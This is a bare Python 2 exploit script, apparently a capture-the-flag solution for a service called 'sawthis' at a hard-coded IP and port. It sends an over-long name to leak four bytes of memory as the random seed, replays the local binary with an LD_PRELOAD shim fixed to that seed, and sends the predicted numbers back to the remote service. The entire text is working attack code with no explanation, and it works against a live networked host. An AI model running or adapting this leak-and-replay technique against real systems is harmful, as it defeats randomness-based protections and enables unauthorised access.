import socket
import struct
import os

def q(a):
  return struct.pack("I", a)

def recv_until(st):
  ret = ""
  while st not in ret:
    ret += s.recv(100)
  return ret

s = socket.create_connection(("87.107.123.3", 31337))

recv_until("ou? ")
s.send("123456789012345678901234567890123456789012345678901234567890123|\n")
r = recv_until("it:")
s.send("0\n")
m = r.index("|")+1
data = r[m:m+4]
print len(data)
print data
print data.encode("hex")
seed =  (struct.unpack("I", data)[0])
os.environ["SRAND"] = str(seed)
os.system("echo -e 'a\n0' |LD_PRELOAD=./set.so ./sawthis > x")
with open("x", "r") as f:
	lines = f.readlines()

nums = []
for line in lines:
	if ("N = " in line):
		m = int(line[4:])
		nums.append(m)
		print m

nums  = nums[1:]

for n in nums:
	recv_until(":")
	s.send(str(n)+"\n")

while True:
	print s.recv(1200)
